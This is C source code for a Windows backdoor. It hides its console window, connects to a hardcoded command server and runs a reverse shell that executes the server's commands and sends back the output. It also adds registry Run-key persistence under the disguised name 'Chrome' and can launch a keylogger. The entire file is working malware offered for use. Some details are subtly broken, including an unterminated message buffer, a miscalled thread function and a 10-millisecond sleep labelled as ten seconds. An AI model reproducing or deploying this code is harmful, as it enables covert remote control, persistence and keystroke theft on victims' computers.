#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"


int sock;

void RunOnBoot() {
    char errorMessage[18] = "Persistence failed";
    char successMessage[91] = "Created persistence at HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    TCHAR szPath[MAX_PATH];
    DWORD pathLength = 0;

    pathLength = GetModuleFileName(NULL, szPath, MAX_PATH);
    if(pathLength == 0) {
        //failed
        send(sock, errorMessage, sizeof(errorMessage), 0);
        return;
    }

    HKEY NewValue;
    //open the registry and attempt to add value
    if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewValue) != ERROR_SUCCESS) {
        //failed
        send(sock, errorMessage, sizeof(errorMessage), 0);
        return;
    }
    DWORD pathLengthBytes = pathLength * sizeof(*szPath);
    if(RegSetValueEx(NewValue, TEXT("Chrome"), 0, REG_SZ, (LPBYTE) szPath, pathLengthBytes) != ERROR_SUCCESS) {
        //failed
        RegCloseKey(NewValue); //close the key
        send(sock, errorMessage, sizeof(errorMessage), 0);
        return;  
    }
    send(sock, successMessage, sizeof(successMessage), 0);
    RegCloseKey(NewValue); //close the key
}

void Shell() {
    char buffer[1024];
    char container[1024];
    char totalResponse[18384];

    while(1) {
        //set all values to 0
        memset(&buffer, 0, 1024);
        memset(&container, 0, 1024);
        memset(&totalResponse, 0, 18384);

        //recive from the server
        recv(sock, buffer, 1024, 0);
        
        if(strncmp("q", buffer, 1) == 0) { //string compare(a, b, number of chars)
            break;
        } else if (strncmp("cd ", buffer, 3) == 0) {
            char *temp = buffer + 3; //shifts buffer over 3 chars
            chdir(temp); //changes program dir
            strcat(totalResponse, temp); //sends the dir back to the server
        } else if (strncmp("persist", buffer, 7) == 0) {
            RunOnBoot();
        } else if (strncmp("keylogger", buffer, 9) == 0) {
            //keylogger must run on a different thread
            //CreateThread returns a thread, however we dont really need it since we only start the logger
            HANDLE thread = CreateThread(NULL, 0, StartKeylogger(), NULL, 0, NULL);
            strcat(totalResponse, "Started Keylogger");
        } else {
            //execute command
            FILE *file; //file is basically just used as a string stream
            file = _popen(buffer, "r");
            
            //read response from stream ("file" in this case)
            while(fgets(container, 1024, file) != NULL) {
                //moves chars from container to total response
                //TODO: Try swapping the while with fgets to total response
                strcat(totalResponse, container);
            }
            fclose(file);
        }
        send(sock, totalResponse, sizeof(totalResponse), 0);
    }
    
    //exit program
    closesocket(sock);
    WSACleanup();
    exit(0);
}

//Main method
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    HWND stealth; //window handle
    AllocConsole(); //creates a console
    stealth = FindWindowA("ConsoleWindowClass", NULL); //retrives handle to top level window
    ShowWindow(stealth, 0); //0 is basically hiding the window

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "192.168.0.10";
    ServPort = 789;

    //WSAStartup is to init winsock (if returns 0, it started correctly)
    if(WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) { 
        exit(1);
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0); //use ipv4, use tcp for socket

    //setup ServAddr
    memset(&ServAddr, 0, sizeof(ServAddr)); //sets ServAddr to all 0
    ServAddr.sin_family = AF_INET; //ipv4
    ServAddr.sin_addr.s_addr = inet_addr(ServIP); //setip
    ServAddr.sin_port = htons(ServPort); //set port

    //try to connect every 10 sec
    while(connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
        Sleep(10); //wait 10 sec
    }
    Shell();
}